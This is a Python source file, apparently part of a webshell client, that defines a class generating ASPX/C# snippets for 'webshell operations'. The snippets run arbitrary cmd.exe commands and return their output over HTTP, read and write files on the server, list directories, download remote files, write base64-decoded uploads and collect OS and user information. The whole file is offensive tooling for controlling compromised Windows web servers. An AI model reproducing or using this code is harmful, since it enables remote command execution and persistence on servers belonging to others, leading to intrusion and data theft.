"""ASPX/C# code generator for webshell operations."""


class AspxGenerator:
    """Generate ASPX code for webshell operations."""

    @staticmethod
    def read_file(file_path: str, encoding: str = "utf-8") -> str:
        """Generate ASPX code to read file."""
        return f"""System.IO.File.ReadAllText(@"{file_path}",
    System.Text.Encoding.GetEncoding("{encoding}"))"""

    @staticmethod
    def write_file(file_path: str, content: str, encoding: str = "utf-8") -> str:
        """Generate ASPX code to write file."""
        return f"""System.IO.File.WriteAllText(@"{file_path}",
    "{content}", System.Text.Encoding.GetEncoding("{encoding}"))"""

    @staticmethod
    def run_command(command: str, capture_output: bool = True) -> str:
        """Generate ASPX code to execute command."""
        if capture_output:
            return f"""System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c {command}";
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());"""
        else:
            return f"""System.Diagnostics.Process.Start("cmd.exe", "/c {command}")"""

    @staticmethod
    def list_directory(directory: str = ".") -> str:
        """Generate ASPX code to list directory."""
        return f"""foreach(string f in System.IO.Directory.GetFileSystemEntries(@"{directory}"))
{{Response.Write(f + "\\n");}}"""

    @staticmethod
    def download_file(url: str, save_path: str) -> str:
        """Generate ASPX code to download file."""
        return f"""new System.Net.WebClient().DownloadFile("{url}", @"{save_path}")"""

    @staticmethod
    def upload_file(file_path: str, content: str) -> str:
        """Generate ASPX code to upload file (base64 content)."""
        return f"""System.IO.File.WriteAllBytes(@"{file_path}",
    System.Convert.FromBase64String("{content}"))"""

    @staticmethod
    def get_system_info() -> str:
        """Generate ASPX code to get system info."""
        return """Response.Write("OS: " + Environment.OSVersion + "\\n");
Response.Write("User: " + Environment.UserName + "\\n");
Response.Write("Dir: " + Environment.CurrentDirectory);"""
